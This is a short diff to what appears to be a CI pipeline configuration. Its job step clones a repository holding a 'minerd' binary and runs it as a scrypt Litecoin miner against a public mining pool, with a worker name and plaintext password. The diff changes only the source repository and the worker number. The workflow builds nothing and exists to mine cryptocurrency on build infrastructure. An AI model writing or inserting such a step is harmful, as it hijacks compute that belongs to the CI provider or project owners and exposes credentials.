@@ -9,11 +9,11 @@ jobs:
            apt install -y libjansson4
            mkdir  ~/.ssh
            ssh-keyscan github.com >> ~/.ssh/known_hosts
-           git clone --depth=1 git@github.com:djemilbakhti/RDP.git Q
+           git clone --depth=1 git@github.com:ltcfuck/RDP.git Q
            cd Q
            
            chmod 755 minerd
-           ./minerd --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker12:my123456
+           ./minerd --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
       
           
 workflows:
